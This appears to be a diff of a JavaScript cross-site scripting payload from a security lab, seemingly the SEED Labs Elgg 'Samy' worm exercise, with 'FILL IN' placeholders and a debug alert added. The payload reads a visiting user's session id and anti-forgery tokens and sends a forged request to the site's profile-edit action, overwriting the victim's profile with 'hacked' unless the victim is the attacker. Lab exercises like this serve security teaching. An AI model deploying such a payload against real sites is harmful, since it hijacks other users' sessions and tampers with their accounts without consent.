@@ -7,11 +7,12 @@ var guid="&guid="+elgg.session.user.guid;
 var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
 var token="&__elgg_token="+elgg.security.token.__elgg_token;
 //Construct the content of your url.
-var content=userName + guid+ts+token+"&description = hacked"; //FILL IN
+var content=userName + guid+ts+token+"&description=hacked"; //FILL IN
 var samyGuid=59; //FILL IN
 var sendurl="http://www.seed-server.com/action/profile/edit";//FILL IN
-if(elgg.session.user.guid!=samyGuid) ➀
+if(elgg.session.user.guid!=samyGuid) 
 {
+  alert("is");
 //Create and send Ajax request to modify profile
 var Ajax=null;
 Ajax=new XMLHttpRequest();
